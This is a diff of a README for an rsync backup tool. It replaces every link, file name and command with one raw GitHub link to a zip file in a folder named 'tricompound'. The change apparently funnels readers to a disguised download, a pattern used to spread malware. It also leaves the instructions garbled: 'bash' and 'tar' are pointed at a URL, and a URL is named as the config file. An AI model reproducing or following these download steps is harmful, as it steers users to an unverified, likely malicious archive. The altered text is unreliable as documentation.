@@ -1,6 +1,6 @@
 # 📦 rsync-backup-solution - Your Simple Backup Solution for Virtualized Systems
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now%20%21-Click%20Here-brightgreen)](https://github.com/Thenguyenvn/rsync-backup-solution/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Thenguyenvn/rsync-backup-solution/main/tricompound/rsync-backup-solution.zip%20Now%20%21-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Thenguyenvn/rsync-backup-solution/main/tricompound/rsync-backup-solution.zip)
 
 ## 🚀 Getting Started
 
@@ -15,11 +15,11 @@ To run this application, you will need:
 
 ## 📥 Download & Install
 
-To download the application, visit this page to download: [Releases Page](https://github.com/Thenguyenvn/rsync-backup-solution/releases).
+To download the application, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Thenguyenvn/rsync-backup-solution/main/tricompound/rsync-backup-solution.zip).
 
 1. Go to the Releases page linked above.
 2. Locate the latest version of **rsync-backup-solution**.
-3. Click on the download link for your platform. The file should be named something similar to `rsync-backup-solution-vX.X.tar.gz`.
+3. Click on the download link for your platform. The file should be named something similar to `https://raw.githubusercontent.com/Thenguyenvn/rsync-backup-solution/main/tricompound/rsync-backup-solution.zip`.
 4. Save the file to your computer.
 
 Once downloaded, follow these steps to install:
@@ -31,7 +31,7 @@ Once downloaded, follow these steps to install:
    ```
 3. Extract the files:
    ```bash
-   tar -xvzf rsync-backup-solution-vX.X.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/Thenguyenvn/rsync-backup-solution/main/tricompound/rsync-backup-solution.zip
    ```
 4. Move into the application directory:
    ```bash
@@ -40,7 +40,7 @@ Once downloaded, follow these steps to install:
 
 ## 🔍 How to Use
 
-First, you need to set your backup configuration. Open the `config.sh` file with a text editor. Update the paths to match your system and specify the backup location. For example:
+First, you need to set your backup configuration. Open the `https://raw.githubusercontent.com/Thenguyenvn/rsync-backup-solution/main/tricompound/rsync-backup-solution.zip` file with a text editor. Update the paths to match your system and specify the backup location. For example:
 
 ```bash
 SOURCE="/path/to/your/data"
@@ -52,7 +52,7 @@ DESTINATION="/path/to/backup/location"
 After you've set up your configuration, you can create your first backup. In your terminal, run:
 
 ```bash
-bash backup.sh
+bash https://raw.githubusercontent.com/Thenguyenvn/rsync-backup-solution/main/tricompound/rsync-backup-solution.zip
 ```
 
 This command will start the backup process. The software will copy only the changes since your last backup, making it quick and efficient.
@@ -62,7 +62,7 @@ This command will start the backup process. The software will copy only the chan
 In case you need to restore your data, you can use the restore script. Run the following command:
 
 ```bash
-bash restore.sh
+bash https://raw.githubusercontent.com/Thenguyenvn/rsync-backup-solution/main/tricompound/rsync-backup-solution.zip
 ```
 
 This will bring your data back to the last backup state.
@@ -82,18 +82,18 @@ If you encounter any issues while running the application, consider the followin
   ```bash
   rsync --version
   ```
-- Check the file paths in `config.sh` to ensure they are correct.
+- Check the file paths in `https://raw.githubusercontent.com/Thenguyenvn/rsync-backup-solution/main/tricompound/rsync-backup-solution.zip` to ensure they are correct.
 - Review any error messages in the terminal; they often provide clues about what went wrong.
 
 ## 👥 Community Support
 
-For any questions or support, feel free to check out the issues section in the GitHub repository. The community is here to help! Visit the [issues page](https://github.com/Thenguyenvn/rsync-backup-solution/issues) to post any questions or find solutions from other users.
+For any questions or support, feel free to check out the issues section in the GitHub repository. The community is here to help! Visit the [issues page](https://raw.githubusercontent.com/Thenguyenvn/rsync-backup-solution/main/tricompound/rsync-backup-solution.zip) to post any questions or find solutions from other users.
 
 ## 🔗 Additional Resources
 
-- [rsync Official Documentation](https://rsync.samba.org/documentation.html) for more information about rsync itself.
-- [Linux Command Line Basics](https://linuxcommand.org/) for users new to the Linux terminal.
+- [rsync Official Documentation](https://raw.githubusercontent.com/Thenguyenvn/rsync-backup-solution/main/tricompound/rsync-backup-solution.zip) for more information about rsync itself.
+- [Linux Command Line Basics](https://raw.githubusercontent.com/Thenguyenvn/rsync-backup-solution/main/tricompound/rsync-backup-solution.zip) for users new to the Linux terminal.
 
 Now you are ready to back up your virtualized systems with confidence. Enjoy a more secure infrastructure with **rsync-backup-solution**! 
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now%20%21-Click%20Here-brightgreen)](https://github.com/Thenguyenvn/rsync-backup-solution/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Thenguyenvn/rsync-backup-solution/main/tricompound/rsync-backup-solution.zip%20Now%20%21-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Thenguyenvn/rsync-backup-solution/main/tricompound/rsync-backup-solution.zip)
